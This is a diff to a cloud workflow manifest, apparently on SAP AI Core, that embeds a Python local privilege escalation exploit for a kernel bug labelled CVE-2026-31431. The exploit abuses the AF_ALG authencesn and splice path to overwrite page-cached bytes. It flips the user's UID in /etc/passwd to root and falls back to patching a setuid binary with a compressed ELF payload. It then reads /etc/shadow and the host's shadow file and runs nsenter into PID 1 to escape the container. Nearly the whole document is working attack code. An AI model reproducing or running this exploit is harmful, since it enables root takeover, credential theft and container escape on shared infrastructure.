@@ -4,11 +4,11 @@ metadata:
   name: cve31431-wf
   labels:
     scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
-    ai.sap.com/version: "1.0.0"
+    ai.sap.com/version: "1.1.0"
   annotations:
     scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
     executables.ai.sap.com/name: "cve31431-wf"
-    executables.ai.sap.com/description: "CVE-2026-31431 training job LPE probe"
+    executables.ai.sap.com/description: "CVE-2026-31431 training job LPE probe (rootsecdev method)"
 spec:
   templates:
   - name: exploit
@@ -18,14 +18,16 @@ spec:
       args:
       - |
         python3 - << 'PYEOF'
-        import os, sys, socket, struct, subprocess, zlib
+        import errno, os, pwd, socket, struct, subprocess, sys, zlib
 
         def r(k, v): print(f"[WFTRAIN] {k}: {str(v)[:4000]}", flush=True)
 
-        r("PHASE", "1-SECURITY-CONTEXT")
+        # ── PHASE 1: RECON ───────────────────────────────────────────────────────
+        r("PHASE", "1-RECON")
         r("KERNEL", os.popen("uname -r").read().strip())
         r("HOSTNAME", os.uname().nodename)
         r("UID", f"uid={os.getuid()} gid={os.getgid()} euid={os.geteuid()}")
+        r("USER", os.environ.get("USER", pwd.getpwuid(os.getuid()).pw_name))
 
         status = open("/proc/self/status").read()
         for line in status.split("\n"):
@@ -36,70 +38,243 @@ spec:
 
         no_new_privs = int([l for l in status.split("\n") if "NoNewPrivs" in l][0].split(":")[1])
         r("NONEWPRIVS_VALUE", str(no_new_privs))
-        r("EXPLOIT_VIABLE", str(no_new_privs == 0))
 
+        # Dump all PIDs for NNP mapping
         for pid in sorted(os.listdir("/proc")):
             if not pid.isdigit(): continue
             try:
                 st = open(f"/proc/{pid}/status").read()
                 nnp = [l for l in st.split("\n") if "NoNewPrivs" in l]
-                uid = [l for l in st.split("\n") if l.startswith("Uid")]
-                name = [l for l in st.split("\n") if l.startswith("Name")]
-                r(f"PID_{pid}", f"name={name[0].split(':')[1].strip() if name else '?'} uid={uid[0].split(':')[1].strip() if uid else '?'} nnp={nnp[0].split(':')[1].strip() if nnp else '?'}")
+                uid_l = [l for l in st.split("\n") if l.startswith("Uid")]
+                name_l = [l for l in st.split("\n") if l.startswith("Name")]
+                r(f"PID_{pid}", f"name={name_l[0].split(':')[1].strip() if name_l else '?'} "
+                               f"uid={uid_l[0].split(':')[1].strip() if uid_l else '?'} "
+                               f"nnp={nnp[0].split(':')[1].strip() if nnp else '?'}")
             except: pass
 
-        if no_new_privs == 0:
-            r("PHASE", "2-EXPLOIT")
-            AF_ALG, SOCK_SEQPACKET = 38, 5
-            SOL_ALG = 279
-            alg_name = "authencesn(hmac(sha256),cbc(aes))"
-            key = bytes.fromhex('0800010000000010' + '0'*64)
+        # ── PHASE 2: EXPLOIT (rootsecdev /etc/passwd method) ────────────────────
+        r("PHASE", "2-EXPLOIT" if no_new_privs == 0 else "2-SKIPPED-NNP1")
 
-            def write4(file_fd, t, payload4):
-                a = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
-                a.bind(("aead", alg_name))
-                a.setsockopt(SOL_ALG, 1, key)
-                a.setsockopt(SOL_ALG, 5, None, 4)
-                u, _ = a.accept()
-                null = b'\x00'
-                o = t + 4
-                u.sendmsg([b"A"*4 + payload4],
-                          [(SOL_ALG, 3, null*4),(SOL_ALG, 2, b'\x10'+null*19),(SOL_ALG, 4, b'\x08'+null*3)], 32768)
-                rp, wp = os.pipe()
-                os.splice(file_fd, wp, o, offset_src=0)
-                os.splice(rp, u.fileno(), o)
-                try: u.recv(8 + t)
-                except: pass
-                u.close(); a.close()
-                os.close(rp); os.close(wp)
-
-            target = None
-            for c in ["/usr/bin/su","/bin/su","/usr/bin/newgrp","/usr/bin/passwd","/usr/bin/gpasswd"]:
-                if os.path.exists(c) and os.stat(c).st_mode & 0o4000:
-                    target = c; break
-            r("TARGET", str(target))
-
-            if target:
-                payload = zlib.decompress(bytes.fromhex(
-                    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209"
-                    "a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e"
-                    "56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
-                ))
-                fd = os.open(target, os.O_RDONLY)
-                i = 0
-                while i < len(payload):
-                    write4(fd, i, payload[i:i+4])
-                    i += 4
-                r("PAGE_CACHE_WRITE", "COMPLETE")
-                proc = subprocess.Popen([target], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                out, err = proc.communicate(
-                    b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\nnsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n",
-                    timeout=30)
-                r("SHELL_STDOUT", out.decode("utf-8","replace") or "(empty)")
-                r("SHELL_RC", str(proc.returncode))
-                r("ROOT", "YES" if os.geteuid() == 0 else f"NO uid={os.getuid()}")
+        if no_new_privs != 0:
+            r("SKIP_REASON", "NoNewPrivs=1 blocks setuid execve — su cannot gain CAP_SETUID")
+            r("DONE", "complete — NoNewPrivs=1 still set on training pod")
         else:
-            r("PHASE", "2-SKIPPED")
+            r("EXPLOIT_METHOD", "rootsecdev /etc/passwd UID-flip")
+
+            AF_ALG = 38
+            SOL_ALG = 279
+            ALG_SET_KEY = 1
+            ALG_SET_IV = 2
+            ALG_SET_OP = 3
+            ALG_SET_AEAD_ASSOCLEN = 4
+            ALG_OP_DECRYPT = 0
+            CRYPTO_AUTHENC_KEYA_PARAM = 1
+            ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
+            PASSWD = "/etc/passwd"
+
+            def authenc_keyblob(authkey, enckey):
+                rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
+                keyparam = struct.pack(">I", len(enckey))
+                return rtattr + keyparam + authkey + enckey
+
+            def write4(target_path, file_offset, four_bytes):
+                if len(four_bytes) != 4:
+                    raise ValueError("write4 requires exactly 4 bytes")
+                fd = os.open(target_path, os.O_RDONLY)
+                try:
+                    os.read(fd, 4096)  # ensure page is cached
+                    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+                    master.bind(("aead", ALG_NAME))
+                    master.setsockopt(SOL_ALG, ALG_SET_KEY,
+                                      authenc_keyblob(b"\x00" * 32, b"\x00" * 16))
+                    op, _ = master.accept()
+                    try:
+                        aad = b"\x00" * 4 + four_bytes  # SPI || seqno_lo
+                        cmsg = [
+                            (SOL_ALG, ALG_SET_OP,            struct.pack("I", ALG_OP_DECRYPT)),
+                            (SOL_ALG, ALG_SET_IV,            struct.pack("I", 16) + b"\x00" * 16),
+                            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", 8)),
+                        ]
+                        op.sendmsg([aad], cmsg, socket.MSG_MORE)
+                        pr, pw = os.pipe()
+                        try:
+                            n = os.splice(fd, pw, 32, offset_src=file_offset)
+                            os.splice(pr, op.fileno(), n)
+                        finally:
+                            os.close(pr); os.close(pw)
+                        try:
+                            op.recv(64)
+                        except OSError as e:
+                            if e.errno not in (errno.EBADMSG, errno.EINVAL):
+                                raise
+                    finally:
+                        op.close(); master.close()
+                finally:
+                    os.close(fd)
+
+            def find_uid_field(path, username):
+                with open(path, "rb") as f:
+                    data = f.read()
+                needle = username.encode() + b":"
+                line_start = 0
+                while line_start < len(data):
+                    if data.startswith(needle, line_start):
+                        j = line_start + len(needle)
+                        colon1 = data.index(b":", j)    # after password field
+                        uid_off = colon1 + 1
+                        uid_end = data.index(b":", uid_off)
+                        return uid_off, data[uid_off:uid_end].decode("ascii"), data[uid_end+1:uid_end+6].decode("ascii","replace")
+                    nl = data.find(b"\n", line_start)
+                    if nl < 0: break
+                    line_start = nl + 1
+                raise LookupError(f"user {username!r} not found in {path}")
+
+            try:
+                username = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
+                r("TARGET_USER", username)
+                uid_off, uid_str, gid_start = find_uid_field(PASSWD, username)
+                r("PASSWD_UID_OFFSET", str(uid_off))
+                r("PASSWD_UID_STR", uid_str)
+                r("PASSWD_GID_START", gid_start)
+
+                r("AUTHENCESN_BIND", "attempting")
+                test_sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+                test_sock.bind(("aead", ALG_NAME))
+                test_sock.close()
+                r("AUTHENCESN_BIND", "SUCCESS")
+
+                uid_len = len(uid_str)
+                r("UID_LEN", str(uid_len))
+
+                if uid_len == 4:
+                    # Single write: replace 4-char UID with "0000"
+                    r("WRITE_STRATEGY", "single write4 (4-digit UID)")
+                    write4(PASSWD, uid_off, b"0000")
+                elif uid_len == 5:
+                    # Two writes: "XXXXX" → "00000"
+                    # Write 1: positions 0-3 of UID → "0000"
+                    # Write 2: position 4 of UID + first 3 chars of gid_start → "0" + gid_start[:3]
+                    # (the 3 GID chars are the same values, so we're effectively only changing UID[4])
+                    r("WRITE_STRATEGY", "two write4 calls (5-digit UID)")
+                    gid_bytes = gid_start[:3].encode()
+                    write4(PASSWD, uid_off,   b"0000")
+                    write4(PASSWD, uid_off+4, b"0" + gid_bytes)
+                elif uid_len <= 3:
+                    # Pad with colon — "XXX:" prefix then overwrite second field start
+                    r("WRITE_STRATEGY", f"multi-write for {uid_len}-digit UID")
+                    # Write "0:" + first 2 chars of gid at uid_off
+                    gid_bytes = gid_start[:2].encode()
+                    write4(PASSWD, uid_off, b"0\x3a" + gid_bytes)
+                else:
+                    r("SKIP_REASON", f"UID length {uid_len} not handled")
+                    uid_len = None
+
+                if uid_len is not None:
+                    # Verify page cache
+                    with open(PASSWD, "rb") as f:
+                        f.seek(uid_off)
+                        landed = f.read(uid_len)
+                    r("PASSWD_AFTER_PATCH", landed.decode("ascii","replace"))
+
+                    try:
+                        pwent = pwd.getpwnam(username)
+                        r("GETPWNAM_UID", str(pwent.pw_uid))
+                    except Exception as e:
+                        r("GETPWNAM_ERR", str(e))
+
+                    # Try escalation via su
+                    r("SU_EXEC", f"running su {username}")
+                    try:
+                        proc = subprocess.Popen(
+                            ["su", username],
+                            stdin=subprocess.PIPE,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE
+                        )
+                        # PAM validates against /etc/shadow (untouched)
+                        # passwd in page cache shows uid=0 → su calls setuid(0)
+                        out, err = proc.communicate(
+                            b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\n"
+                            b"cat /proc/1/root/etc/shadow 2>&1\n"
+                            b"nsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n",
+                            timeout=30
+                        )
+                        r("SU_STDOUT", out.decode("utf-8","replace") or "(empty)")
+                        r("SU_STDERR", err.decode("utf-8","replace") or "(empty)")
+                        r("SU_RC", str(proc.returncode))
+                    except subprocess.TimeoutExpired:
+                        r("SU_RC", "TIMEOUT")
+                    except Exception as e:
+                        r("SU_ERR", str(e))
+
+                    r("EUID_AFTER", str(os.geteuid()))
+                    r("ROOT", "YES — ESCALATION CONFIRMED" if os.geteuid() == 0 else f"NO uid={os.getuid()}")
+
+                    # Also try Theori ELF approach as fallback
+                    r("FALLBACK_THEORI", "attempting ELF page-cache overwrite on /usr/bin/su")
+                    try:
+                        import zlib as zl
+                        payload = zl.decompress(bytes.fromhex(
+                            "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209"
+                            "a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e"
+                            "56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
+                        ))
+                        target = None
+                        for c in ["/usr/bin/su","/bin/su","/usr/bin/newgrp","/usr/bin/passwd"]:
+                            if os.path.exists(c) and os.stat(c).st_mode & 0o4000:
+                                target = c; break
+                        r("THEORI_TARGET", str(target))
+                        if target:
+                            fd = os.open(target, os.O_RDONLY)
+                            i = 0
+
+                            # Use rootsecdev-style write4 with theori payload
+                            def write4_elf(target_path, fd, file_offset, four_bytes):
+                                os.read(fd, 4096)
+                                master2 = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+                                master2.bind(("aead", ALG_NAME))
+                                master2.setsockopt(SOL_ALG, ALG_SET_KEY,
+                                                   authenc_keyblob(b"\x00"*32, b"\x00"*16))
+                                op2, _ = master2.accept()
+                                try:
+                                    aad2 = b"\x00"*4 + four_bytes
+                                    cmsg2 = [
+                                        (SOL_ALG, ALG_SET_OP,            struct.pack("I", ALG_OP_DECRYPT)),
+                                        (SOL_ALG, ALG_SET_IV,            struct.pack("I", 16) + b"\x00"*16),
+                                        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", 8)),
+                                    ]
+                                    op2.sendmsg([aad2], cmsg2, socket.MSG_MORE)
+                                    pr2, pw2 = os.pipe()
+                                    try:
+                                        n2 = os.splice(fd, pw2, 32, offset_src=file_offset)
+                                        os.splice(pr2, op2.fileno(), n2)
+                                    finally:
+                                        os.close(pr2); os.close(pw2)
+                                    try: op2.recv(64)
+                                    except OSError as e:
+                                        if e.errno not in (errno.EBADMSG, errno.EINVAL): raise
+                                finally:
+                                    op2.close(); master2.close()
+
+                            while i < len(payload):
+                                write4_elf(target, fd, i, payload[i:i+4])
+                                i += 4
+                            os.close(fd)
+                            r("THEORI_WRITES", "COMPLETE")
+                            proc2 = subprocess.Popen(
+                                [target], stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            out2, err2 = proc2.communicate(
+                                b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\nexit\n",
+                                timeout=30)
+                            r("THEORI_STDOUT", out2.decode("utf-8","replace") or "(empty)")
+                            r("THEORI_RC", str(proc2.returncode))
+                    except Exception as e:
+                        r("THEORI_ERR", str(e))
+
+            except Exception as e:
+                r("EXPLOIT_ERR", str(e))
+                import traceback; r("TRACEBACK", traceback.format_exc())
 
         r("DONE", "complete")
         PYEOF
